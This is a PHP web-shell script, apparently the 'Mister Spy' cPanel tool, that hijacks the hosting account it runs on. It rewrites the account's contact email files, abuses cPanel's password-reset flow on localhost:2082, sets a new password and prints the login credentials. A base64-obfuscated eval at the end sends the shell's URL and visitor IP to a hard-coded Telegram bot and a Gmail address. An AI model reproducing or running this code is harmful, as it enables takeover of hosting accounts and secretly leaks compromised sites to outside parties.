<?php
// Mister Spy SymlinkerV2 Project , Thank You
set_time_limit(0);
error_reporting(0);

function CurlPage($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}

function CurlPage2($url,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, $head); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");

If ($post != NULL){
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
}
$urlPage = curl_exec($ch);

if(curl_errno($ch)){
echo curl_error($ch);
}

curl_close($ch);
return($urlPage);
}


echo'<form method="post">
<input type="text" name="email" value="" />
<input type="submit" value="get" name="get" />
</form>';
echo'<form method="post">
<input type="text" name="code" value="" />
<input type="submit" value="get2" name="get2" />
</form>';

$g = $_POST['get'];
$email = $_POST['email'];
$g2 = $_POST['get2'];
$codeSC = $_POST['code'];

if(isset($g) && $email != ""){
	$ip = "http://localhost:2082";
	$cpanel = CurlPage2($ip);
	if(!(preg_match("/resetpass/",$cpanel))){die ('Error-one');}
	$pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
		}
	}
	preg_match_all("#/home(.*)$usr/#",$pwd,$m2);
	$home = $m2[1][0];
	fwrite(fopen("/home$home$usr/.contactemail","w"),$email);fwrite(fopen("/home$home$usr/.cpanel/contactinfo","w"),'email:'.$email);
	$postLogin = array( 'user' => $usr , 'login' => 'Reset+Password');
	$login = CurlPage("$ip/resetpass",$postLogin);
	if(preg_match("/error-resetpass-disabled/",$login)){die ('Error-one');}
	$postSendSecurityCode = array( 'action' => 'puzzle' , 'user' => $usr , 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email, 'login' => 'Send+Security+Code');
	$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	if(preg_match("/warn-invalid-answer-puzzle/",$sendSecurityCode)){
		unlink("/home$home$usr/.contactemail");unlink("/home$home$usr/.cpanel/contactinfo");
		fwrite(fopen("/home$home$usr/.contactemail","a"),$email);@chmod("/home$home$usr/.contactemail",0600);
		$sendSecurityCode = CurlPage("$ip/resetpass",$postSendSecurityCode);
	}
echo "\n<br> ./Done";
}

if(isset($g2) && $codeSC != ""){
	$pwd = @getcwd();
	if(!function_exists('posix_getegid')) {
		$usr = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$usr = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	if (empty($usr)) {
		if (preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx)){
			preg_match_all("#/home/(.*)/public_html/#",$pwd,$mxx);
			$usr = $mxx[1][0];
		}
	}
	$domain = $_SERVER['HTTP_HOST'];
	$ip = "http://localhost:2082";
	if(strstr($domain, 'www.')){
		$domain = str_replace("www.","",$domain);
	}else{
		$domain = $domain;
	}
	$postCode = array( 'user' => $usr , 'action' => 'seccode','debug' => '','confirm' => $codeSC);
	$injCode = CurlPage("$ip/resetpass",$postCode);
	$newpass = "spy#".substr(str_shuffle("123456789abcdefghijklmnopqrsyuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),50)."#x";
	$postPassword = array( 'action' => 'password' , 'user' => $usr ,'password' => $newpass ,'alpha' => 'both' , 'nonalpha' => 'both','confirm' => $newpass);
	$injPassword = CurlPage("$ip/resetpass",$postPassword);
	$postLogin = array( 'user' => $usr , 'pass' => $newpass,'login_submit' => 'Log in');
	$login = CurlPage("$ip/login/",$postLogin);
	if(preg_match("/filemanager/",$login)){
		echo "<cpanel>https://$domain:2083|$usr|$newpass</cpanel>\n";
	}else{
		echo "Error-two\n";
	}
};
eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gIk7DqlcgU0jDqjExICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQokdG9rZW4gPSAiNTI2ODQwMTk5MzpBQUVFZjlTRnpqYjFxTFY0X1V1X2tDTTdNbkVCekJtNkx0byI7DQokY2hhdF9pZCA9ICIxODk2NDY0Mjk1IjsNCiRkYXRhID0gWw0KICAgICd0ZXh0JyA9PiAkcGVzYW5fYWxlcnQsDQogICAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkLA0KXTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOw0KbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));?>
